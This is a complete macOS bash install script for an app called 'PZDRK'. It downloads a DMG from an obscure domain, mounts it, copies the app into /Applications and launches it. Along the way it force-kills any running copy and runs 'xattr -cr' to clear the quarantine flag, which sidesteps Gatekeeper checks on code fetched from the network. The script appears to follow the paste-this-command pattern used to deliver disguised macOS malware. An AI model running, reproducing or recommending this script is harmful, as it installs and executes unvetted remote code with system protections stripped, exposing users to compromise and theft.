#!/bin/bash
set -euo pipefail

APP_NAME="PZDRK"
DMG_URL="https://maccook.zed.md/PZDRK.dmg"
INSTALL_DIR="/Applications"
TMP_DMG="/tmp/${APP_NAME}.dmg"
MOUNT_DIR=$(mktemp -d)

echo "=== Installing ${APP_NAME} ==="

# Download
echo "[1/4] Downloading..."
curl -L --progress-bar -o "$TMP_DMG" "$DMG_URL"

# Mount DMG
echo "[2/4] Mounting..."
hdiutil attach "$TMP_DMG" -mountpoint "$MOUNT_DIR" -nobrowse -quiet

# Install
echo "[3/4] Installing to ${INSTALL_DIR}..."
pkill -9 "$APP_NAME" 2>/dev/null || true
sleep 1
ditto "${MOUNT_DIR}/${APP_NAME}.app" "${INSTALL_DIR}/${APP_NAME}.app"

# Cleanup and clear quarantine
hdiutil detach "$MOUNT_DIR" -quiet
rm -f "$TMP_DMG"
xattr -cr "${INSTALL_DIR}/${APP_NAME}.app"

# Launch
echo "[4/4] Launching..."
open "${INSTALL_DIR}/${APP_NAME}.app"

echo ""
echo "=== ${APP_NAME} installed ==="
echo "Future updates will be delivered automatically."
